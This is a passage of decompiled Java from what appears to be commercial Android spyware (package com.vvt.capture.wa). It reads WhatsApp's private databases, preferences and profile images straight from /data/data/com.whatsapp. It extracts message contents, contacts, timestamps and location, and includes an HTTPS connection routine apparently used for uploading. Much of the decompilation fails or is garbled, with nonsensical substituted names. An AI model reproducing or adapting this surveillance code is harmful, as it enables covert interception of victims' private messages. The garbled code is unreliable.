    //   577: getstatic 23	com/vvt/capture/wa/full/a:MyUncaughtExceptionHandler	Z
    //   580: istore 15
    //   582: iload 15
    //   584: ifeq +3 -> 587
    //   587: iconst_0
    //   588: istore 15
    //   590: aconst_null
    //   591: astore 16
    //   593: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   596: istore 11
    //   598: iload 11
    //   600: ifeq +3 -> 603
    //   603: aload 7
    //   605: ifnull -54 -> 551
    //   608: aload 7
    //   610: invokeinterface 116 1 0
    //   615: goto -64 -> 551
    //   618: astore 7
    //   620: aload 16
    //   622: astore 4
    //   624: aload 7
    //   626: astore 16
    //   628: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   631: istore 10
    //   633: iload 10
    //   635: ifeq +3 -> 638
    //   638: aload 4
    //   640: ifnull +10 -> 650
    //   643: aload 4
    //   645: invokeinterface 116 1 0
    //   650: aload 16
    //   652: athrow
    //   653: astore 16
    //   655: aload 7
    //   657: astore 4
    //   659: goto -31 -> 628
    //   662: astore 16
    //   664: goto -36 -> 628
    //   667: astore 16
    //   669: aload 4
    //   671: astore 7
    //   673: goto -96 -> 577
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	676	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	676	1	paramInt	int
    //   0	676	2	paramString1	String
    //   0	676	3	paramString2	String
    //   1	669	4	localObject1	Object
    //   4	559	5	str1	String
    //   9	286	6	str2	String
    //   15	550	7	localObject2	Object
    //   571	1	7	localException1	Exception
    //   575	34	7	localObject3	Object
    //   618	38	7	localObject4	Object
    //   671	1	7	localObject5	Object
    //   30	142	8	str3	String
    //   36	138	9	arrayOfString	String[]
    //   71	128	10	bool1	boolean
    //   217	5	10	i	int
    //   264	3	10	bool2	boolean
    //   283	28	10	j	int
    //   407	3	10	bool3	boolean
    //   440	7	10	k	int
    //   453	3	10	bool4	boolean
    //   474	5	10	m	int
    //   504	130	10	bool5	boolean
    //   81	312	11	bool6	boolean
    //   555	3	11	n	int
    //   596	3	11	bool7	boolean
    //   84	297	12	localObject6	Object
    //   88	278	13	str4	String
    //   103	75	14	str5	String
    //   106	17	15	i1	int
    //   128	461	15	bool8	boolean
    //   109	542	16	localObject7	Object
    //   653	1	16	localObject8	Object
    //   662	1	16	localObject9	Object
    //   667	1	16	localException2	Exception
    //   112	448	17	i2	int
    //   138	3	18	l	long
    //   156	157	20	i3	int
    //   162	144	21	i4	int
    // Exception table:
    //   from	to	target	type
    //   189	196	571	java/lang/Exception
    //   210	217	571	java/lang/Exception
    //   221	228	571	java/lang/Exception
    //   235	238	571	java/lang/Exception
    //   242	247	571	java/lang/Exception
    //   259	264	571	java/lang/Exception
    //   278	283	571	java/lang/Exception
    //   287	292	571	java/lang/Exception
    //   294	299	571	java/lang/Exception
    //   312	317	571	java/lang/Exception
    //   326	331	571	java/lang/Exception
    //   333	338	571	java/lang/Exception
    //   340	343	571	java/lang/Exception
    //   345	350	571	java/lang/Exception
    //   352	356	571	java/lang/Exception
    //   358	361	571	java/lang/Exception
    //   365	370	571	java/lang/Exception
    //   374	378	571	java/lang/Exception
    //   380	385	571	java/lang/Exception
    //   387	390	571	java/lang/Exception
    //   399	404	571	java/lang/Exception
    //   449	453	571	java/lang/Exception
    //   467	474	571	java/lang/Exception
    //   478	485	571	java/lang/Exception
    //   495	499	571	java/lang/Exception
    //   189	196	618	finally
    //   210	217	618	finally
    //   221	228	618	finally
    //   235	238	618	finally
    //   242	247	618	finally
    //   259	264	618	finally
    //   278	283	618	finally
    //   287	292	618	finally
    //   294	299	618	finally
    //   312	317	618	finally
    //   326	331	618	finally
    //   333	338	618	finally
    //   340	343	618	finally
    //   345	350	618	finally
    //   352	356	618	finally
    //   358	361	618	finally
    //   365	370	618	finally
    //   374	378	618	finally
    //   380	385	618	finally
    //   387	390	618	finally
    //   399	404	618	finally
    //   449	453	618	finally
    //   467	474	618	finally
    //   478	485	618	finally
    //   495	499	618	finally
    //   577	580	653	finally
    //   177	182	662	finally
    //   177	182	667	java/lang/Exception
  }
  
  /* Error */
  public static ArrayList a(SQLiteDatabase paramSQLiteDatabase1, SQLiteDatabase paramSQLiteDatabase2, String paramString1, long paramLong1, long paramLong2, String paramString2, boolean paramBoolean1, String paramString3, String paramString4, com.vvt.base.b paramb, boolean paramBoolean2)
  {
    // Byte code:
    //   0: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   3: istore 13
    //   5: iload 13
    //   7: ifeq +3 -> 10
    //   10: new 309	java/util/ArrayList
    //   13: astore 14
    //   15: aload 14
    //   17: invokespecial 310	java/util/ArrayList:<init>	()V
    //   20: bipush 6
    //   22: anewarray 4	java/lang/Object
    //   25: astore 15
    //   27: aload 15
    //   29: iconst_0
    //   30: ldc 118
    //   32: aastore
    //   33: aload 15
    //   35: iconst_1
    //   36: ldc 118
    //   38: aastore
    //   39: aload 15
    //   41: iconst_2
    //   42: ldc 92
    //   44: aastore
    //   45: aload 15
    //   47: iconst_3
    //   48: ldc 92
    //   50: aastore
    //   51: aload 15
    //   53: iconst_4
    //   54: ldc_w 495
    //   57: aastore
    //   58: aload 15
    //   60: iconst_5
    //   61: ldc_w 495
    //   64: aastore
    //   65: ldc_w 492
    //   68: aload 15
    //   70: invokestatic 61	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   73: astore 16
    //   75: iconst_2
    //   76: anewarray 57	java/lang/String
    //   79: astore 17
    //   81: lload_3
    //   82: invokestatic 500	java/lang/Long:toString	(J)Ljava/lang/String;
    //   85: astore 15
    //   87: aload 17
    //   89: iconst_0
    //   90: aload 15
    //   92: aastore
    //   93: iconst_1
    //   94: istore 13
    //   96: lload 5
    //   98: invokestatic 500	java/lang/Long:toString	(J)Ljava/lang/String;
    //   101: astore 15
    //   103: aload 17
    //   105: iload 13
    //   107: aload 15
    //   109: aastore
    //   110: iconst_1
    //   111: istore 18
    //   113: iload 18
    //   115: anewarray 4	java/lang/Object
    //   118: astore 15
    //   120: aload 15
    //   122: iconst_0
    //   123: ldc 118
    //   125: aastore
    //   126: ldc 76
    //   128: aload 15
    //   130: invokestatic 61	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   133: astore 19
    //   135: ldc -74
    //   137: astore 15
    //   139: aload_0
    //   140: astore 20
    //   142: aload_0
    //   143: aload 15
    //   145: aconst_null
    //   146: aload 16
    //   148: aload 17
    //   150: aconst_null
    //   151: aconst_null
    //   152: aload 19
    //   154: aload 7
    //   156: invokevirtual 503	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   159: astore 16
    //   161: aload 16
    //   163: ifnull +122 -> 285
    //   166: aload_2
    //   167: astore 20
    //   169: aload_0
    //   170: astore 15
    //   172: aload 11
    //   174: astore 19
    //   176: aload_2
    //   177: aload_0
    //   178: aload_1
    //   179: aload 16
    //   181: iload 8
    //   183: aload 9
    //   185: aload 10
    //   187: aload 11
    //   189: iload 12
    //   191: invokestatic 506	com/vvt/capture/wa/full/a:a	(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase;Landroid/database/sqlite/SQLiteDatabase;Landroid/database/Cursor;ZLjava/lang/String;Ljava/lang/String;Lcom/vvt/base/removeFromPath;Z)Ljava/util/ArrayList;
    //   194: astore 20
    //   196: aload 16
    //   198: ifnull +10 -> 208
    //   201: aload 16
    //   203: invokeinterface 116 1 0
    //   208: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   211: istore 18
    //   213: iload 18
    //   215: ifeq +3 -> 218
    //   218: aload 20
    //   220: areturn
    //   221: astore 20
    //   223: aconst_null
    //   224: astore 16
    //   226: getstatic 23	com/vvt/capture/wa/full/a:MyUncaughtExceptionHandler	Z
    //   229: istore 13
    //   231: iload 13
    //   233: ifeq +3 -> 236
    //   236: aload 16
    //   238: ifnull +10 -> 248
    //   241: aload 16
    //   243: invokeinterface 116 1 0
    //   248: aload 14
    //   250: astore 20
    //   252: goto -44 -> 208
    //   255: astore 20
    //   257: aconst_null
    //   258: astore 16
    //   260: aload 16
    //   262: ifnull +10 -> 272
    //   265: aload 16
    //   267: invokeinterface 116 1 0
    //   272: aload 20
    //   274: athrow
    //   275: astore 20
    //   277: goto -17 -> 260
    //   280: astore 20
    //   282: goto -56 -> 226
    //   285: aload 14
    //   287: astore 20
    //   289: goto -93 -> 196
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	292	0	paramSQLiteDatabase1	SQLiteDatabase
    //   0	292	1	paramSQLiteDatabase2	SQLiteDatabase
    //   0	292	2	paramString1	String
    //   0	292	3	paramLong1	long
    //   0	292	5	paramLong2	long
    //   0	292	7	paramString2	String
    //   0	292	8	paramBoolean1	boolean
    //   0	292	9	paramString3	String
    //   0	292	10	paramString4	String
    //   0	292	11	paramb	com.vvt.base.removeFromPath
    //   0	292	12	paramBoolean2	boolean
    //   3	229	13	bool1	boolean
    //   13	273	14	localArrayList1	ArrayList
    //   25	146	15	localObject1	Object
    //   73	193	16	localObject2	Object
    //   79	70	17	arrayOfString	String[]
    //   111	103	18	bool2	boolean
    //   133	42	19	localObject3	Object
    //   140	79	20	localObject4	Object
    //   221	1	20	localException1	Exception
    //   250	1	20	localArrayList2	ArrayList
    //   255	18	20	localObject5	Object
    //   275	1	20	localObject6	Object
    //   280	1	20	localException2	Exception
    //   287	1	20	localArrayList3	ArrayList
    // Exception table:
    //   from	to	target	type
    //   154	159	221	java/lang/Exception
    //   154	159	255	finally
    //   189	194	275	finally
    //   226	229	275	finally
    //   189	194	280	java/lang/Exception
  }
  
  public static ArrayList a(String paramString1, long paramLong1, long paramLong2, String paramString2, boolean paramBoolean1, com.vvt.base.b paramb, boolean paramBoolean2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = false;
    localObject1 = null;
    boolean bool2 = false;
    SQLiteDatabase localSQLiteDatabase = null;
    String str1 = "/data/data/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml";
    String str2 = "/data/data/com.whatsapp/files/me.jpg";
    try
    {
      Object localObject2 = new java/io/File;
      String str3 = "/data/data/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml";
      ((File)localObject2).<init>(str3);
      boolean bool3 = ((File)localObject2).exists();
      if (!bool3)
      {
        localObject2 = new java/io/File;
        str3 = "/dbdata/databases/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml";
        ((File)localObject2).<init>(str3);
        bool3 = ((File)localObject2).exists();
        if (bool3)
        {
          str1 = "/dbdata/databases/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml";
          str2 = "/dbdata/databases/com.whatsapp/files/me.jpg";
          bool3 = b;
          if (!bool3) {}
        }
      }
      localObject2 = "com.whatsapp";
      str3 = "msgstore.db";
      localObject1 = com.vvt.capture.wa.b.b.a((String)localObject2, str3);
      localObject2 = "com.whatsapp";
      str3 = "wa.db";
      if (localObject3 == null) {
        break label280;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        localException = localException;
        bool3 = c;
        if ((!bool3) || (localObject1 != null)) {
          ((SQLiteDatabase)localObject1).close();
        }
        if (localSQLiteDatabase != null) {
          localSQLiteDatabase.close();
        }
        localObject1 = localArrayList;
      }
    }
    finally
    {
      bool3 = false;
      localObject3 = null;
      localObject1 = localObject4;
    }
    ((SQLiteDatabase)localObject3).close();
    label280:
    if (localSQLiteDatabase != null) {
      localSQLiteDatabase.close();
    }
    throw ((Throwable)localObject1);
  }
  
  public static ArrayList a(String paramString1, long paramLong1, long paramLong2, String paramString2, boolean paramBoolean1, String paramString3, String paramString4, String paramString5, String paramString6, com.vvt.base.b paramb, boolean paramBoolean2)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    localObject1 = null;
    boolean bool1 = false;
    SQLiteDatabase localSQLiteDatabase = null;
    try
    {
      localObject1 = com.vvt.capture.wa.b.b.a(paramString3);
      Object localObject2;
      boolean bool2;
      if (localObject3 == null) {
        break label158;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        try
        {
          localSQLiteDatabase = com.vvt.capture.wa.b.b.a(paramString4);
          localObject2 = paramString1;
          localObject2 = a((SQLiteDatabase)localObject1, localSQLiteDatabase, paramString1, paramLong1, paramLong2, paramString2, paramBoolean1, paramString5, paramString6, paramb, paramBoolean2);
          if (localObject1 != null) {
            ((SQLiteDatabase)localObject1).close();
          }
          if (localSQLiteDatabase != null) {
            localSQLiteDatabase.close();
          }
          localObject1 = localObject2;
          bool1 = a;
          if (bool1) {}
          return (ArrayList)localObject1;
        }
        finally
        {
          Object localObject3 = localObject1;
          localObject1 = localObject5;
          continue;
        }
        localException = localException;
        bool2 = c;
        if ((!bool2) || (localObject1 != null)) {
          ((SQLiteDatabase)localObject1).close();
        }
        if (localSQLiteDatabase != null) {
          localSQLiteDatabase.close();
        }
        localObject1 = localArrayList;
      }
    }
    finally
    {
      localObject4 = finally;
      bool2 = false;
      localObject3 = null;
      localObject1 = localObject4;
    }
    ((SQLiteDatabase)localObject3).close();
    label158:
    if (localSQLiteDatabase != null) {
      localSQLiteDatabase.close();
    }
    throw ((Throwable)localObject1);
  }
  
  public static ArrayList a(String paramString, long paramLong1, long paramLong2, boolean paramBoolean1, com.vvt.base.b paramb, boolean paramBoolean2)
  {
    return a(paramString, paramLong1, paramLong2, null, paramBoolean1, paramb, paramBoolean2);
  }
  
  public static ArrayList a(String paramString1, long paramLong1, long paramLong2, boolean paramBoolean1, String paramString2, String paramString3, String paramString4, String paramString5, com.vvt.base.b paramb, boolean paramBoolean2)
  {
    return a(paramString1, paramLong1, paramLong2, null, paramBoolean1, paramString2, paramString3, paramString4, paramString5, paramb, paramBoolean2);
  }
  
  private static ArrayList a(String paramString1, SQLiteDatabase paramSQLiteDatabase1, SQLiteDatabase paramSQLiteDatabase2, Cursor paramCursor, boolean paramBoolean1, String paramString2, String paramString3, com.vvt.base.b paramb, boolean paramBoolean2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool4 = true;
    bool1 = paramCursor.moveToLast();
    com.vvt.capture.wa.a.c localc;
    boolean bool5;
    com.vvt.im.events.info.d locald;
    int n;
    int i1;
    Object localObject2;
    int i2;
    ICallLogData.Direction localDirection;
    label188:
    long l1;
    Object localObject3;
    String str;
    Object localObject4;
    int j;
    if (bool1)
    {
      bool1 = a;
      if (bool1) {}
      localc = new com/vvt/capture/wa/a/c;
      localc.<init>();
      localObject1 = ICallLogData.Direction.IN;
      new ArrayList();
      new ArrayList();
      bool5 = false;
      locald = a(paramString1, paramString2, paramString3);
      int i = paramCursor.getColumnIndex("media_wa_type");
      n = paramCursor.getInt(i);
      i = paramCursor.getColumnIndex("_id");
      i1 = paramCursor.getInt(i);
      i = paramCursor.getColumnIndex("data");
      localObject2 = paramCursor.getString(i);
      localObject1 = "key_from_me";
      i = paramCursor.getColumnIndex((String)localObject1);
      i = paramCursor.getInt(i);
      i2 = 1;
      if (i != i2) {
        break label577;
      }
      localDirection = ICallLogData.Direction.OUT;
      i = paramCursor.getColumnIndex("received_timestamp");
      l1 = paramCursor.getLong(i);
      localObject1 = new java/text/SimpleDateFormat;
      ((SimpleDateFormat)localObject1).<init>("dd/MM/yy HH:mm:ss");
      localObject3 = new java/util/Date;
      ((Date)localObject3).<init>(l1);
      str = ((SimpleDateFormat)localObject1).format((Date)localObject3);
      localObject1 = "key_remote_jid";
      i = paramCursor.getColumnIndex((String)localObject1);
      localObject4 = paramCursor.getString(i);
      if (localObject4 == null) {
        break label585;
      }
      localObject1 = "@FxFileObserverWorker.us";
      j = ((String)localObject4).endsWith((String)localObject1);
      if (j == 0) {
        break label585;
      }
      j = 1;
      f = Float.MIN_VALUE;
    }
    Object localObject5;
    Object localObject6;
    Object localObject7;
    com.vvt.im.events.info.b localb;
    Object localObject8;
    label577:
    label585:
    boolean bool6;
    for (int i3 = j;; bool6 = false)
    {
      localObject5 = a(paramSQLiteDatabase2, (String)localObject4, paramBoolean1);
      localObject3 = Boolean.valueOf(i3);
      localObject6 = paramb.f();
      localObject1 = paramString1;
      localObject7 = paramString1;
      localb = com.vvt.capture.wa.b.a.a(paramString1, (Boolean)localObject3, (String)localObject4, (com.vvt.capture.wa.a.d)localObject5, bool4, paramString1, (String)localObject6);
      localObject7 = paramSQLiteDatabase2;
      localObject6 = paramString1;
      localObject8 = paramCursor;
      localObject7 = a(paramSQLiteDatabase2, paramString1, paramCursor, localDirection, (String)localObject4, locald, paramBoolean1);
      List localList = com.vvt.capture.wa.b.a.a((String)localObject4, paramSQLiteDatabase1);
      localObject6 = a(paramSQLiteDatabase2, paramString1, localList, locald, paramBoolean1, paramb);
      i2 = com.vvt.capture.wa.b.a.a((String)localObject2, n);
      j = a;
      if (j != 0) {}
      j = 1;
      f = Float.MIN_VALUE;
      if (n != j)
      {
        int k = 2;
        f = 2.8E-45F;
        if (n != k)
        {
          k = 3;
          f = 4.2E-45F;
          if (n != k)
          {
            k = 9;
            f = 1.3E-44F;
            if (n != k) {
              break label808;
            }
          }
        }
      }
      localObject5 = a(paramSQLiteDatabase1, paramString1, i1, n, localDirection, paramb, paramBoolean2);
      localObject1 = ((com.vvt.im.events.info.a)localObject5).c();
      bool2 = com.vvt.ag.b.a((String)localObject1);
      if (!bool2) {
        break label600;
      }
      localObject1 = ((com.vvt.im.events.info.a)localObject5).g();
      bool2 = com.vvt.ag.b.a((String)localObject1);
      if (!bool2) {
        break label600;
      }
      bool2 = a;
      if (bool2) {}
      bool2 = paramCursor.moveToPrevious();
      if (bool2) {
        break;
      }
      bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      return localArrayList;
      localDirection = ICallLogData.Direction.IN;
      break label188;
      bool2 = false;
      f = 0.0F;
      localObject1 = null;
    }
    label600:
    Object localObject1 = ((com.vvt.im.events.info.a)localObject5).c();
    boolean bool2 = com.vvt.ag.b.a((String)localObject1);
    if (!bool2) {
      bool2 = true;
    }
    for (float f = Float.MIN_VALUE;; f = 0.0F)
    {
      localObject4 = ((com.vvt.im.events.info.a)localObject5).g();
      boolean bool7 = com.vvt.ag.b.a((String)localObject4);
      if (!bool7) {
        i2 = com.vvt.capture.wa.b.a.a((String)localObject4, n);
      }
      for (;;)
      {
        bool5 = bool2;
        localObject2 = localObject4;
        localObject1 = localObject5;
        localObject4 = null;
        for (;;)
        {
          localc.a(i2);
          localc.a(bool6);
          localc.a(locald);
          localc.a((String)localObject2);
          localc.a(localDirection);
          localc.b(l1);
          localc.b(str);
          localc.a(localb);
          localc.a((f)localObject7);
          localc.b(bool5);
          if (localObject4 != null) {
            localc.a((com.vvt.im.events.info.c)localObject4);
          }
          if (localObject1 != null) {
            localc.a((com.vvt.im.events.info.a)localObject1);
          }
          localObject3 = ((List)localObject6).iterator();
          for (;;)
          {
            bool2 = ((Iterator)localObject3).hasNext();
            if (!bool2) {
              break;
            }
            localObject1 = (e)((Iterator)localObject3).next();
            localc.a((e)localObject1);
          }
          label808:
          int m = 4;
          f = 5.6E-45F;
          if (n == m)
          {
            localObject1 = "";
            localObject4 = new java/util/Scanner;
            ((Scanner)localObject4).<init>((String)localObject2);
            do
            {
              boolean bool8 = ((Scanner)localObject4).hasNextLine();
              if (!bool8) {
                break;
              }
              localObject5 = ((Scanner)localObject4).nextLine();
              localObject8 = "FN:";
              bool7 = ((String)localObject5).startsWith((String)localObject8);
            } while (!bool7);
            localObject1 = ((String)localObject5).trim();
            localObject8 = ":";
            int i4 = ((String)localObject5).indexOf((String)localObject8) + 1;
            localObject1 = ((String)localObject1).substring(i4);
            if (localObject4 != null) {
              ((Scanner)localObject4).close();
            }
            localObject4 = new java/lang/StringBuilder;
            ((StringBuilder)localObject4).<init>();
            localObject5 = "Name: ";
            localObject2 = (String)localObject5 + (String)localObject1;
            m = 0;
            localObject1 = null;
            f = 0.0F;
            localObject4 = null;
          }
          else
          {
            m = 5;
            f = 7.0E-45F;
            if (n == m)
            {
              new com.vvt.im.events.info.c();
              localObject4 = com.vvt.capture.wa.b.a.a(paramSQLiteDatabase1, i1);
              m = 0;
              f = 0.0F;
              localObject1 = null;
              double d1;
              double d2;
              long l2;
              for (;;)
              {
                d1 = ((com.vvt.im.events.info.c)localObject4).a();
                d2 = 0.0D;
                boolean bool9 = d1 < d2;
                if (bool9) {
                  break;
                }
                d1 = ((com.vvt.im.events.info.c)localObject4).b();
                d2 = 0.0D;
                bool9 = d1 < d2;
                if (bool9) {
                  break;
                }
                int i5 = 18;
                if (m >= i5) {
                  break;
                }
                l2 = 10000L;
                SystemClock.sleep(l2);
                localObject4 = com.vvt.capture.wa.b.a.a(paramSQLiteDatabase1, i1);
                m += 1;
              }
              localObject1 = ICallLogData.Direction.OUT;
              if (localDirection == localObject1)
              {
                d1 = ((com.vvt.im.events.info.c)localObject4).a();
                d2 = 0.0D;
                bool3 = d1 < d2;
                if (bool3)
                {
                  d1 = ((com.vvt.im.events.info.c)localObject4).b();
                  d2 = 0.0D;
                  bool3 = d1 < d2;
                  if (bool3)
                  {
                    l2 = 10000L;
                    SystemClock.sleep(l2);
                    localObject4 = com.vvt.capture.wa.b.a.a(paramSQLiteDatabase1, i1);
                  }
                }
              }
              bool3 = a;
              if (bool3) {}
              bool3 = false;
              localObject1 = null;
              f = 0.0F;
              continue;
              bool3 = b;
              if (bool3) {}
              localArrayList.add(localc);
              break;
            }
            bool3 = false;
            localObject1 = null;
            f = 0.0F;
            localObject4 = null;
          }
        }
        localObject4 = localObject2;
      }
      boolean bool3 = false;
      localObject1 = null;
    }
  }
  
  private static List a(SQLiteDatabase paramSQLiteDatabase, String paramString, List paramList, com.vvt.im.events.info.d paramd, boolean paramBoolean, com.vvt.base.b paramb)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = ImType.WHATSAPP;
    Object localObject2 = ImMediaFileType.USER_PROFILE;
    localObject2 = com.vvt.im.a.c.a(paramString, (ImType)localObject1, (ImMediaFileType)localObject2);
    boolean bool2 = true;
    Iterator localIterator = paramList.iterator();
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (String)localIterator.next();
      e locale = new com/vvt/im/events/info/e;
      locale.<init>();
      Object localObject3 = com.vvt.im.a.c.a(ImMediaFileType.USER_PROFILE);
      Object localObject4 = a(paramSQLiteDatabase, (String)localObject1, paramBoolean);
      String str = com.vvt.capture.wa.b.a.a((com.vvt.capture.wa.a.d)localObject4, (String)localObject1);
      locale.c(str);
      localObject4 = ((com.vvt.capture.wa.a.d)localObject4).a();
      locale.e((String)localObject4);
      locale.d((String)localObject1);
      localObject4 = com.vvt.capture.wa.b.a.b((String)localObject1);
      locale.b((String)localObject4);
      localObject4 = paramb.f();
      localObject1 = com.vvt.capture.wa.b.a.a((String)localObject1, bool2, paramString, (String)localObject4);
      localObject4 = new java/lang/StringBuilder;
      ((StringBuilder)localObject4).<init>();
      localObject3 = ((StringBuilder)localObject4).append((String)localObject3);
      localObject4 = "_Parti_createNewOne";
      localObject3 = (String)localObject4;
      localObject1 = com.vvt.io.d.a((byte[])localObject1, (String)localObject2, (String)localObject3);
      locale.a((String)localObject1);
      bool1 = false;
      localObject1 = new byte[0];
      locale.a((byte[])localObject1);
      localArrayList.add(locale);
    }
    return localArrayList;
  }
  
  private static boolean a(int paramInt, com.vvt.base.b paramb, long paramLong)
  {
    int i = 1;
    float f = Float.MIN_VALUE;
    boolean bool4 = false;
    long l1 = 0L;
    boolean bool5 = paramLong < l1;
    if (!bool5) {}
    label94:
    boolean bool3;
    for (bool5 = false;; bool5 = bool3)
    {
      long l2;
      if (paramInt == i)
      {
        l2 = paramb.b();
        boolean bool1 = paramLong < l2;
        if (!bool1) {
          break label94;
        }
      }
      for (;;)
      {
        bool5 = a;
        if (bool5) {}
        return bool4;
        int j = 2;
        f = 2.8E-45F;
        if (paramInt == j)
        {
          l2 = paramb.d();
          boolean bool2 = paramLong < l2;
          if (bool2) {}
        }
        else
        {
          label135:
          do
          {
            do
            {
              bool4 = bool5;
              break;
              int k = 3;
              f = 4.2E-45F;
              if (paramInt != k) {
                break label135;
              }
              l2 = paramb.c();
              bool3 = paramLong < l2;
            } while (!bool3);
            break;
            l2 = paramb.e();
            bool3 = paramLong < l2;
          } while (!bool3);
        }
      }
    }
  }
  
  /* Error */
  public static boolean a(SQLiteDatabase paramSQLiteDatabase)
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_1
    //   2: aconst_null
    //   3: astore_2
    //   4: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   7: istore_3
    //   8: iload_3
    //   9: ifeq +3 -> 12
    //   12: iload_1
    //   13: anewarray 4	java/lang/Object
    //   16: astore 4
    //   18: aload 4
    //   20: iconst_0
    //   21: ldc 78
    //   23: aastore
    //   24: ldc 76
    //   26: aload 4
    //   28: invokestatic 61	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   31: astore 5
    //   33: ldc 80
    //   35: astore 4
    //   37: aload_0
    //   38: astore 6
    //   40: aload_0
    //   41: aload 4
    //   43: aconst_null
    //   44: aconst_null
    //   45: aconst_null
    //   46: aconst_null
    //   47: aconst_null
    //   48: aload 5
    //   50: invokevirtual 84	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   53: astore 6
    //   55: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   58: istore 7
    //   60: iload 7
    //   62: ifeq +3 -> 65
    //   65: aload 6
    //   67: ifnull +10 -> 77
    //   70: aload 6
    //   72: invokeinterface 116 1 0
    //   77: iload_1
    //   78: istore_3
    //   79: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   82: istore 7
    //   84: iload 7
    //   86: ifeq +3 -> 89
    //   89: iload_3
    //   90: ireturn
    //   91: astore 6
    //   93: iconst_0
    //   94: istore_3
    //   95: aconst_null
    //   96: astore 6
    //   98: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   101: istore 7
    //   103: iload 7
    //   105: ifeq +3 -> 108
    //   108: aload 6
    //   110: ifnull +10 -> 120
    //   113: aload 6
    //   115: invokeinterface 116 1 0
    //   120: iconst_0
    //   121: istore_3
    //   122: aconst_null
    //   123: astore 6
    //   125: goto -46 -> 79
    //   128: astore 6
    //   130: aload_2
    //   131: ifnull +9 -> 140
    //   134: aload_2
    //   135: invokeinterface 116 1 0
    //   140: aload 6
    //   142: athrow
    //   143: astore 4
    //   145: aload 6
    //   147: astore_2
    //   148: aload 4
    //   150: astore 6
    //   152: goto -22 -> 130
    //   155: astore 4
    //   157: goto -59 -> 98
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	160	0	paramSQLiteDatabase	SQLiteDatabase
    //   1	77	1	bool1	boolean
    //   3	145	2	localObject1	Object
    //   7	115	3	bool2	boolean
    //   16	26	4	localObject2	Object
    //   143	6	4	localObject3	Object
    //   155	1	4	localException1	Exception
    //   31	18	5	str	String
    //   38	33	6	localObject4	Object
    //   91	1	6	localException2	Exception
    //   96	28	6	localObject5	Object
    //   128	18	6	localObject6	Object
    //   150	1	6	localObject7	Object
    //   58	46	7	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   48	53	91	java/lang/Exception
    //   48	53	128	finally
    //   55	58	143	finally
    //   98	101	143	finally
    //   55	58	155	java/lang/Exception
  }
  
  private static boolean a(String paramString1, String paramString2)
  {
    boolean bool1 = false;
    ConditionVariable localConditionVariable = new android/os/ConditionVariable;
    localConditionVariable.<init>();
    d = false;
    for (;;)
    {
      try
      {
        localObject1 = new java/net/URL;
        ((URL)localObject1).<init>(paramString1);
        localObject1 = ((URL)localObject1).openConnection();
        localObject1 = (HttpsURLConnection)localObject1;
        Thread localThread = new java/lang/Thread;
        b localb = new com/vvt/capture/wa/full/b;
        localb.<init>((HttpsURLConnection)localObject1, paramString2, localConditionVariable);
        localThread.<init>(localb);
        localThread.start();
        long l = 300000L;
        boolean bool2 = localConditionVariable.block(l);
        if (!bool2) {
          continue;
        }
        bool3 = d;
      }
      catch (Exception localException)
      {
        Object localObject1;
        boolean bool3 = c;
        if (!bool3) {
          continue;
        }
        bool3 = false;
        Object localObject2 = null;
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return bool3;
      if (localObject1 != null) {
        ((HttpsURLConnection)localObject1).disconnect();
      }
      bool3 = false;
      localObject1 = null;
    }
  }
  
  /* Error */
  private static long b(SQLiteDatabase paramSQLiteDatabase)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: iconst_m1
    //   3: i2l
    //   4: lstore_2
    //   5: ldc 76
    //   7: astore 4
    //   9: iconst_1
    //   10: istore 5
    //   12: iload 5
    //   14: anewarray 4	java/lang/Object
    //   17: astore 6
    //   19: aconst_null
    //   20: astore 7
    //   22: ldc 118
    //   24: astore 8
    //   26: aload 6
    //   28: iconst_0
    //   29: aload 8
    //   31: aastore
    //   32: aload 4
    //   34: aload 6
    //   36: invokestatic 61	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   39: astore 9
    //   41: ldc -74
    //   43: astore 6
    //   45: aconst_null
    //   46: astore 7
    //   48: iconst_0
    //   49: istore 10
    //   51: aconst_null
    //   52: astore 8
    //   54: ldc_w 726
